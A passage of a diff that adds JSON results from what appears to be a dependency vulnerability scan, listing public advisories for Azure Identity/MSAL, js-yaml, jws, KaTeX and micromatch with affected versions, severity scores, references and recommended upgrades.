+                      ],
+                      "type": "ECOSYSTEM"
+                    }
+                  ],
+                  "versions": [
+                    "1.14.4-beta",
+                    "1.15.0"
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/06/GHSA-m5vv-6r4h-3vj9/GHSA-m5vv-6r4h-3vj9.json"
+                  },
+                  "package": {
+                    "ecosystem": "NuGet",
+                    "name": "Azure.Identity",
+                    "purl": "pkg:nuget/Azure.Identity"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "1.11.4"
+                        }
+                      ],
+                      "type": "ECOSYSTEM"
+                    }
+                  ],
+                  "versions": [
+                    "1.0.0",
+                    "1.1.0",
+                    "1.1.1",
+                    "1.10.0",
+                    "1.10.1",
+                    "1.10.2",
+                    "1.10.3",
+                    "1.10.4",
+                    "1.11.0",
+                    "1.11.1",
+                    "1.11.2",
+                    "1.11.3",
+                    "1.2.0",
+                    "1.2.1",
+                    "1.2.2",
+                    "1.2.3",
+                    "1.3.0",
+                    "1.4.0",
+                    "1.4.1",
+                    "1.5.0",
+                    "1.6.0",
+                    "1.6.1",
+                    "1.7.0",
+                    "1.8.0",
+                    "1.8.1",
+                    "1.8.2",
+                    "1.9.0"
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/06/GHSA-m5vv-6r4h-3vj9/GHSA-m5vv-6r4h-3vj9.json"
+                  },
+                  "package": {
+                    "ecosystem": "NuGet",
+                    "name": "Microsoft.Identity.Client",
+                    "purl": "pkg:nuget/Microsoft.Identity.Client"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "4.61.0"
+                        },
+                        {
+                          "fixed": "4.61.3"
+                        }
+                      ],
+                      "type": "ECOSYSTEM"
+                    }
+                  ],
+                  "versions": [
+                    "4.61.0",
+                    "4.61.1",
+                    "4.61.2"
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2024-35255",
+                "GO-2024-2918"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-362"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2024-06-11T19:57:01Z",
+                "nvd_published_at": "2024-06-11T17:16:03Z",
+                "severity": "MODERATE"
+              },
+              "details": "Azure Identity Libraries and Microsoft Authentication Library Elevation of Privilege Vulnerability.",
+              "id": "GHSA-m5vv-6r4h-3vj9",
+              "modified": "2025-07-22T15:12:31.350751Z",
+              "published": "2024-06-11T18:30:50Z",
+              "references": [
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-35255"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/AzureAD/microsoft-authentication-library-for-dotnet/issues/4806#issuecomment-2178960340"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/Azure/azure-sdk-for-go/commit/50774cd9709905523136fb05e8c85a50e8984499"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/Azure/azure-sdk-for-java/commit/5bf020d6ea056de40e2738e3647a4e06f902c18d"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/Azure/azure-sdk-for-js/commit/c6aa75d312ae463e744163cedfd8fc480cc8d492"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/Azure/azure-sdk-for-net/commit/9279a4f38bf69b457cfb9b354f210e0a540a5c53"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/Azure/azure-sdk-for-python/commit/cb065acd7d0f957327dc4f02d1646d4e51a94178"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-35255"
+                }
+              ],
+              "related": [
+                "CGA-22v2-fxwf-9fr6",
+                "CGA-239r-c5f9-fpfj",
+                "CGA-23qm-339g-q5rq",
+                "CGA-24w3-c8cq-57qw",
+                "CGA-2692-hcq7-xjm8",
+                "CGA-28v8-7f8r-m9ww",
+                "CGA-295j-75j3-84vw",
+                "CGA-2cm4-vpc6-pv3j",
+                "CGA-2jpc-9pc4-35x9",
+                "CGA-2p8f-mv2m-8p2g",
+                "CGA-2q47-7rqc-rvpr",
+                "CGA-2r8r-8pf9-93p6",
+                "CGA-2whj-v58w-p3cw",
+                "CGA-2x2c-6f9x-w8vp",
+                "CGA-2xfh-qmgq-vx5v",
+                "CGA-33cm-cxfp-hq9x",
+                "CGA-35qq-v4x7-g8hr",
+                "CGA-3gfh-xg79-64rx",
+                "CGA-3hgh-xw5g-q968",
+                "CGA-3mg9-gppp-p5xg",
+                "CGA-42mp-vp7j-m293",
+                "CGA-46jv-359v-37c2",
+                "CGA-48qh-3cmx-x3q7",
+                "CGA-4c8h-55mj-27g9",
+                "CGA-4cp8-v8x9-xf65",
+                "CGA-4g9m-vv8j-hw69",
+                "CGA-4gf6-v2x3-r55p",
+                "CGA-4hfg-7vmx-9jvw",
+                "CGA-4q6g-7c97-xpcc",
+                "CGA-4wjw-qhr2-p3mg",
+                "CGA-525c-q846-rphh",
+                "CGA-562h-vqjm-ghfg",
+                "CGA-56xw-wjg8-j46r",
+                "CGA-5c4f-crg6-6jx2",
+                "CGA-5f2c-7cjw-vfxg",
+                "CGA-5hj9-rjqf-qcxc",
+                "CGA-5ppx-hc8c-fq3g",
+                "CGA-5qxp-943m-6pf3",
+                "CGA-5rw9-rrmv-pmfr",
+                "CGA-5xwc-hffc-phx4",
+                "CGA-63vw-p545-47gm",
+                "CGA-67hg-88j4-hpq8",
+                "CGA-6ppc-7w2f-hw86",
+                "CGA-6w2h-93jf-xf67",
+                "CGA-6wqc-q5xf-q3mx",
+                "CGA-73qv-xhj6-j54c",
+                "CGA-7c7g-h9fv-q8j3",
+                "CGA-7f7r-5pp2-5g35",
+                "CGA-7g64-4rrc-2xmx",
+                "CGA-7mwf-x7vp-3hh2",
+                "CGA-7qrr-xjp6-fjxm",
+                "CGA-7w94-v262-g4jv",
+                "CGA-82x3-3574-2q9q",
+                "CGA-84mf-6w7v-xpm3",
+                "CGA-87rr-22r2-g8x6",
+                "CGA-8mj5-qc52-76qf",
+                "CGA-8qw6-v3xw-qphj",
+                "CGA-8x4m-9598-h9g4",
+                "CGA-8xqf-2j7q-9gjw",
+                "CGA-925c-qrgr-37xp",
+                "CGA-94wr-fc7q-9496",
+                "CGA-96hr-8566-xc9j",
+                "CGA-98x5-2cwf-6r85",
+                "CGA-9932-7qxv-xj4w",
+                "CGA-99j2-2p96-3v6m",
+                "CGA-9mpm-96vr-8v53",
+                "CGA-9q5x-f9q6-j52q",
+                "CGA-9qh2-h2gh-qp89",
+                "CGA-9qwr-q2wh-qfvf",
+                "CGA-9x78-w7v8-whxf",
+                "CGA-c7cv-4x3g-mg7h",
+                "CGA-c8q8-c29m-7vmq",
+                "CGA-f2q2-cx8f-c86p",
+                "CGA-f42v-9vqh-cg28",
+                "CGA-f697-72xm-6h8m",
+                "CGA-f7gg-hgq4-hpf4",
+                "CGA-f87j-mwwr-p28x",
+                "CGA-fcv3-88m9-wp7j",
+                "CGA-ff6m-2686-9x3m",
+                "CGA-frrf-2vc3-mfr3",
+                "CGA-g7v9-vhpv-q43g",
+                "CGA-g9xv-mrf3-2jx9",
+                "CGA-h77w-v467-3cxg",
+                "CGA-h92v-4jxh-fr55",
+                "CGA-h96h-jwq9-2843",
+                "CGA-h97j-j3cx-2f23",
+                "CGA-hfq8-fhqg-qhqx",
+                "CGA-hjwx-8794-hj5w",
+                "CGA-hmfp-mpjh-cq5p",
+                "CGA-hqvj-7964-g4jg",
+                "CGA-hvcv-mvpr-vc77",
+                "CGA-j3pv-xcfg-x4gc",
+                "CGA-jq77-vh5j-x3gh",
+                "CGA-m5m3-54c5-23rr",
+                "CGA-mc8m-44p5-273h",
+                "CGA-mf3v-prm8-j3gq",
+                "CGA-mg58-x2gv-pr6r",
+                "CGA-mhr5-mm59-g9v8",
+                "CGA-mpvw-q85f-chh9",
+                "CGA-mwp3-p76c-m3qq",
+                "CGA-p3rr-28v2-97cv",
+                "CGA-p3w2-7jg8-hqrq",
+                "CGA-p5hj-4w5m-gvwp",
+                "CGA-p95p-m854-8783",
+                "CGA-p9mr-h84j-x2p6",
+                "CGA-pgfm-3gq9-vjmg",
+                "CGA-pvqw-fpfq-xh69",
+                "CGA-q5w3-f5vm-g9m3",
+                "CGA-q643-mc95-9f4f",
+                "CGA-q662-93cq-rqr3",
+                "CGA-q6c6-rcxj-5fmh",
+                "CGA-q97p-h56j-m4fv",
+                "CGA-qv5p-9m82-733m",
+                "CGA-r82q-hw76-gmrc",
+                "CGA-r84x-fv23-6q9m",
+                "CGA-rgv3-wg25-j59v",
+                "CGA-rm3q-73jc-4q9m",
+                "CGA-rq8w-587r-f9pm",
+                "CGA-rqxq-m4c2-x9ph",
+                "CGA-v3cj-jgcv-jmhw",
+                "CGA-v6vj-gm26-7r8p",
+                "CGA-vfm9-cgcj-prvp",
+                "CGA-vhj2-vrq8-mm67",
+                "CGA-vw5v-7qhc-9gg5",
+                "CGA-vw6g-89v3-x8pv",
+                "CGA-w34q-7mx6-527r",
+                "CGA-w6v8-wcmv-cfjx",
+                "CGA-wcmr-gjcv-ccpm",
+                "CGA-wqxh-m97h-j5f6",
+                "CGA-wwww-fc3r-f74g",
+                "CGA-wx3h-6vhc-mqpv",
+                "CGA-x3fq-g96j-xmjq",
+                "CGA-x6c3-p37f-phhf",
+                "CGA-x8q8-gpj4-r44c",
+                "CGA-xcg6-jg76-p7wq",
+                "CGA-xcmv-3hxx-7m2v",
+                "CGA-xj36-3hv3-chh7",
+                "CGA-xj6j-5vv8-pjv3",
+                "CGA-xvjv-2jwr-6897",
+                "CGA-xvp5-g73c-c5j4"
+              ],
+              "schema_version": "1.7.3",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
+                  "type": "CVSS_V3"
+                },
+                {
+                  "score": "CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N",
+                  "type": "CVSS_V4"
+                }
+              ],
+              "summary": "Azure Identity Libraries and Microsoft Authentication Library Elevation of Privilege Vulnerability"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "js-yaml",
+            "version": "4.1.0",
+            "ecosystem": "npm"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-mh29-5h37-fv8m"
+              ],
+              "aliases": [
+                "CVE-2025-64718",
+                "GHSA-mh29-5h37-fv8m"
+              ],
+              "max_severity": "5.3"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/11/GHSA-mh29-5h37-fv8m/GHSA-mh29-5h37-fv8m.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "js-yaml",
+                    "purl": "pkg:npm/js-yaml"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "4.0.0"
+                        },
+                        {
+                          "fixed": "4.1.1"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/11/GHSA-mh29-5h37-fv8m/GHSA-mh29-5h37-fv8m.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "js-yaml",
+                    "purl": "pkg:npm/js-yaml"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "3.14.2"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2025-64718"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-1321"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-11-14T14:29:48Z",
+                "nvd_published_at": "2025-11-13T16:15:57Z",
+                "severity": "MODERATE"
+              },
+              "details": "### Impact\n\nIn js-yaml 4.1.0, 4.0.0, and 3.14.1 and below, it's possible for an attacker to modify the prototype of the result of a parsed yaml document via prototype pollution (`__proto__`). All users who parse untrusted yaml documents may be impacted.\n\n### Patches\n\nProblem is patched in js-yaml 4.1.1 and 3.14.2.\n\n### Workarounds\n\nYou can protect against this kind of attack on the server by using `node --disable-proto=delete` or `deno` (in Deno, pollution protection is on by default).\n\n### References\n\nhttps://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html",
+              "id": "GHSA-mh29-5h37-fv8m",
+              "modified": "2025-11-17T15:20:43Z",
+              "published": "2025-11-14T14:29:48Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/nodeca/js-yaml/security/advisories/GHSA-mh29-5h37-fv8m"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-64718"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/nodeca/js-yaml/commit/383665ff4248ec2192d1274e934462bb30426879"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/nodeca/js-yaml/commit/5278870a17454fe8621dbd8c445c412529525266"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/nodeca/js-yaml"
+                }
+              ],
+              "schema_version": "1.7.3",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "js-yaml has prototype pollution in merge (\u003c\u003c)"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "jws",
+            "version": "3.2.2",
+            "ecosystem": "npm"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-869p-cjfg-cm3x"
+              ],
+              "aliases": [
+                "CVE-2025-65945",
+                "GHSA-869p-cjfg-cm3x"
+              ],
+              "max_severity": "7.5"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/12/GHSA-869p-cjfg-cm3x/GHSA-869p-cjfg-cm3x.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "jws",
+                    "purl": "pkg:npm/jws"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "3.2.3"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/12/GHSA-869p-cjfg-cm3x/GHSA-869p-cjfg-cm3x.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "jws",
+                    "purl": "pkg:npm/jws"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "4.0.0"
+                        },
+                        {
+                          "fixed": "4.0.1"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ],
+                  "versions": [
+                    "4.0.0"
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2025-65945"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-347"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-12-04T16:54:15Z",
+                "nvd_published_at": "2025-12-04T19:16:05Z",
+                "severity": "HIGH"
+              },
+              "details": "### Overview\nAn improper signature verification vulnerability exists when using auth0/node-jws with the HS256 algorithm under specific conditions.\n\n### Am I Affected?\nYou are affected by this vulnerability if you meet all of the following preconditions:\n\n1. Application uses the auth0/node-jws implementation of JSON Web Signatures, versions \u003c=3.2.2 || 4.0.0\n2. Application uses the jws.createVerify() function for HMAC algorithms\n3. Application uses user-provided data from the JSON Web Signature Protected Header or Payload in the HMAC secret lookup routines\n\nYou are NOT affected by this vulnerability if you meet any of the following preconditions:\n1. Application uses the jws.verify() interface (note: `auth0/node-jsonwebtoken` users fall into this category and are therefore NOT affected by this vulnerability)\n2. Application uses only asymmetric algorithms (e.g. RS256)\n3. Application doesn’t use user-provided data from the JSON Web Signature Protected Header or Payload in the HMAC secret lookup routines\n\n### Fix\nUpgrade auth0/node-jws version to version 3.2.3 or 4.0.1\n\n### Acknowledgement\nOkta would like to thank Félix Charette for discovering this vulnerability.",
+              "id": "GHSA-869p-cjfg-cm3x",
+              "modified": "2025-12-05T12:36:54.291980Z",
+              "published": "2025-12-04T16:54:15Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/auth0/node-jws/security/advisories/GHSA-869p-cjfg-cm3x"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-65945"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/auth0/node-jws/commit/34c45b2c04434f925b638de6a061de9339c0ea2e"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/auth0/node-jws/commit/4f6e73f24df42f07d632dec6431ade8eda8d11a6"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/auth0/node-jws"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/auth0/node-jws/releases/tag/v3.2.3"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/auth0/node-jws/releases/tag/v4.0.1"
+                }
+              ],
+              "schema_version": "1.7.3",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "auth0/node-jws Improperly Verifies HMAC Signature"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "jws",
+            "version": "4.0.0",
+            "ecosystem": "npm"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-869p-cjfg-cm3x"
+              ],
+              "aliases": [
+                "CVE-2025-65945",
+                "GHSA-869p-cjfg-cm3x"
+              ],
+              "max_severity": "7.5"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/12/GHSA-869p-cjfg-cm3x/GHSA-869p-cjfg-cm3x.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "jws",
+                    "purl": "pkg:npm/jws"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "3.2.3"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/12/GHSA-869p-cjfg-cm3x/GHSA-869p-cjfg-cm3x.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "jws",
+                    "purl": "pkg:npm/jws"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "4.0.0"
+                        },
+                        {
+                          "fixed": "4.0.1"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ],
+                  "versions": [
+                    "4.0.0"
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2025-65945"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-347"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-12-04T16:54:15Z",
+                "nvd_published_at": "2025-12-04T19:16:05Z",
+                "severity": "HIGH"
+              },
+              "details": "### Overview\nAn improper signature verification vulnerability exists when using auth0/node-jws with the HS256 algorithm under specific conditions.\n\n### Am I Affected?\nYou are affected by this vulnerability if you meet all of the following preconditions:\n\n1. Application uses the auth0/node-jws implementation of JSON Web Signatures, versions \u003c=3.2.2 || 4.0.0\n2. Application uses the jws.createVerify() function for HMAC algorithms\n3. Application uses user-provided data from the JSON Web Signature Protected Header or Payload in the HMAC secret lookup routines\n\nYou are NOT affected by this vulnerability if you meet any of the following preconditions:\n1. Application uses the jws.verify() interface (note: `auth0/node-jsonwebtoken` users fall into this category and are therefore NOT affected by this vulnerability)\n2. Application uses only asymmetric algorithms (e.g. RS256)\n3. Application doesn’t use user-provided data from the JSON Web Signature Protected Header or Payload in the HMAC secret lookup routines\n\n### Fix\nUpgrade auth0/node-jws version to version 3.2.3 or 4.0.1\n\n### Acknowledgement\nOkta would like to thank Félix Charette for discovering this vulnerability.",
+              "id": "GHSA-869p-cjfg-cm3x",
+              "modified": "2025-12-05T12:36:54.291980Z",
+              "published": "2025-12-04T16:54:15Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/auth0/node-jws/security/advisories/GHSA-869p-cjfg-cm3x"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-65945"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/auth0/node-jws/commit/34c45b2c04434f925b638de6a061de9339c0ea2e"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/auth0/node-jws/commit/4f6e73f24df42f07d632dec6431ade8eda8d11a6"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/auth0/node-jws"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/auth0/node-jws/releases/tag/v3.2.3"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/auth0/node-jws/releases/tag/v4.0.1"
+                }
+              ],
+              "schema_version": "1.7.3",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "auth0/node-jws Improperly Verifies HMAC Signature"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "katex",
+            "version": "0.16.10",
+            "ecosystem": "npm"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-cg87-wmx4-v546"
+              ],
+              "aliases": [
+                "CVE-2025-23207",
+                "GHSA-cg87-wmx4-v546"
+              ],
+              "max_severity": "6.3"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 0.16.20",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/01/GHSA-cg87-wmx4-v546/GHSA-cg87-wmx4-v546.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "katex",
+                    "purl": "pkg:npm/katex"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0.12.0"
+                        },
+                        {
+                          "fixed": "0.16.21"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2025-23207"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-116",
+                  "CWE-79"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-01-17T21:22:56Z",
+                "nvd_published_at": "2025-01-17T22:15:29Z",
+                "severity": "MODERATE"
+              },
+              "details": "### Impact\nKaTeX users who render untrusted mathematical expressions with `renderToString` could encounter malicious input using `\\htmlData` that runs arbitrary JavaScript, or generate invalid HTML.\n\n### Patches\nUpgrade to KaTeX v0.16.21 to remove this vulnerability.\n\n### Workarounds\n- Avoid use of or turn off the `trust` option, or set it to forbid `\\htmlData` commands.\n- Forbid inputs containing the substring `\"\\\\htmlData\"`.\n- Sanitize HTML output from KaTeX.\n\n### Details\n`\\htmlData` did not validate its attribute name argument, allowing it to generate invalid or malicious HTML that runs scripts.\n\n### For more information\nIf you have any questions or comments about this advisory:\n\n- Open an issue or security advisory in the [KaTeX repository](https://github.com/KaTeX/KaTeX/)\n- Email us at [katex-security@mit.edu](mailto:katex-security@mit.edu)",
+              "id": "GHSA-cg87-wmx4-v546",
+              "modified": "2025-01-21T18:31:02Z",
+              "published": "2025-01-17T21:22:56Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/KaTeX/KaTeX/security/advisories/GHSA-cg87-wmx4-v546"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-23207"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/KaTeX/KaTeX/commit/ff289955e81aab89086eef09254cbf88573d415c"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/KaTeX/KaTeX"
+                }
+              ],
+              "schema_version": "1.7.3",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "KaTeX \\htmlData does not validate attribute names"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "micromatch",
+            "version": "4.0.5",
+            "ecosystem": "npm"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-952p-6rrq-rcjv"
+              ],
+              "aliases": [
+                "CVE-2024-4067",
+                "GHSA-952p-6rrq-rcjv"
+              ],
+              "max_severity": "5.3"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/05/GHSA-952p-6rrq-rcjv/GHSA-952p-6rrq-rcjv.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "micromatch",
+                    "purl": "pkg:npm/micromatch"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "4.0.8"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2024-4067"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-1333"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2024-08-21T22:58:52Z",
+                "nvd_published_at": "2024-05-14T15:42:47Z",
+                "severity": "MODERATE"
+              },
+              "details": "The NPM package `micromatch` prior to version 4.0.8 is vulnerable to Regular Expression Denial of Service (ReDoS). The vulnerability occurs in `micromatch.braces()` in `index.js` because the pattern `.*` will greedily match anything. By passing a malicious payload, the pattern matching will keep backtracking to the input while it doesn't find the closing bracket. As the input size increases, the consumption time will also increase until it causes the application to hang or slow down. There was a merged fix but further testing shows the issue persisted prior to https://github.com/micromatch/micromatch/pull/266. This issue should be mitigated by using a safe pattern that won't start backtracking the regular expression due to greedy matching.\n",
+              "id": "GHSA-952p-6rrq-rcjv",
+              "modified": "2024-08-28T13:12:26Z",
+              "published": "2024-05-14T18:30:54Z",
+              "references": [
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-4067"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/micromatch/micromatch/issues/243"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/micromatch/micromatch/pull/247"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/micromatch/micromatch/pull/266"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/micromatch/micromatch/commit/03aa8052171e878897eee5d7bb2ae0ae83ec2ade"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/micromatch/micromatch/commit/500d5d6f42f0e8dfa1cb5464c6cb420b1b6aaaa0"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://advisory.checkmarx.net/advisory/CVE-2024-4067"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://devhub.checkmarx.com/cve-details/CVE-2024-4067"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/micromatch/micromatch"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/micromatch/micromatch/blob/2c56a8604b68c1099e7bc0f807ce0865a339747a/index.js#L448"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/micromatch/micromatch/releases/tag/4.0.8"
+                }
+              ],
+              "related": [
+                "CGA-6q83-777j-gp5r",
+                "CGA-7j2f-jxvw-gx52",
+                "CGA-9hv5-rmvp-37vw",
+                "CGA-9qj8-ph43-6pq5"
+              ],
+              "schema_version": "1.7.3",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "Regular Expression Denial of Service (ReDoS) in micromatch"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "@azure/msal-node",
+            "version": "2.7.0",
+            "ecosystem": "npm"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-m5vv-6r4h-3vj9"
+              ],
+              "aliases": [
+                "CVE-2024-35255",
+                "GHSA-m5vv-6r4h-3vj9",
+                "GO-2024-2918"
+              ],
+              "max_severity": "6.8"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/06/GHSA-m5vv-6r4h-3vj9/GHSA-m5vv-6r4h-3vj9.json"
+                  },
+                  "package": {
+                    "ecosystem": "PyPI",
+                    "name": "azure-identity",
+                    "purl": "pkg:pypi/azure-identity"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "1.16.1"
+                        }
+                      ],
+                      "type": "ECOSYSTEM"
+                    }
+                  ],
+                  "versions": [
+                    "1.0.0",
+                    "1.0.0b1",
+                    "1.0.0b2",
+                    "1.0.0b3",
